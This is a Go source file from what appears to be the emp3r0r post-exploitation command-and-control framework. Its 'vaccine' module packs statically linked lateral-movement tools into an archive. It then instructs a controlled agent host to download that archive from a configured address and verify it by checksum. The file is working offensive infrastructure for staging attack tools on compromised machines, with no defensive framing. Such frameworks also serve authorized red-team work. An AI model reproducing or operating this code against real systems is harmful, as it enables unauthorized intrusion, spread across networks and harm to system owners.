package modules

import (
	"fmt"
	"os"

	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// upload a zip file that packs several lateral-movement tools
// statically linked, built under alpine
func moduleVaccine() {
	go func() {
		err := CreateVaccineArchive()
		if err != nil {
			logging.Errorf("CreateVaccineArchive: %v", err)
			return
		}
		downloadOpt, ok := live.AvailableModuleOptions["download_addr"]
		if !ok {
			logging.Errorf("Option 'download_addr' not found")
			return
		}
		download_addr := downloadOpt.Val
		checksum := crypto.SHA256SumFile(live.UtilsArchive)
		err = agents.SendCmd(fmt.Sprintf("%s --checksum %s --download_addr %s", def.C2CmdUtils, checksum, download_addr), "", live.ActiveAgent)
		if err != nil {
			logging.Errorf("SendCmd failed: %v", err)
		}
	}()
}

func CreateVaccineArchive() (err error) {
	logging.Infof("Creating archive (%s) for module vaccine...", live.UtilsArchive)
	err = os.Chdir(live.EmpDataDir + "/modules/vaccine") // vaccine is always stored under EmpDataDir
	if err != nil {
		return fmt.Errorf("entering vaccine dir: %v", err)
	}
	defer func() {
		logging.Infof("Created %.2fMB archive (%s) for module vaccine", float64(util.FileSize(live.UtilsArchive))/1024/1024, live.UtilsArchive)
		os.Chdir(live.EmpWorkSpace)
	}()
	err = util.TarXZ(".", live.UtilsArchive)
	if err != nil {
		return fmt.Errorf("creating vaccine archive: %v", err)
	}
	return
}
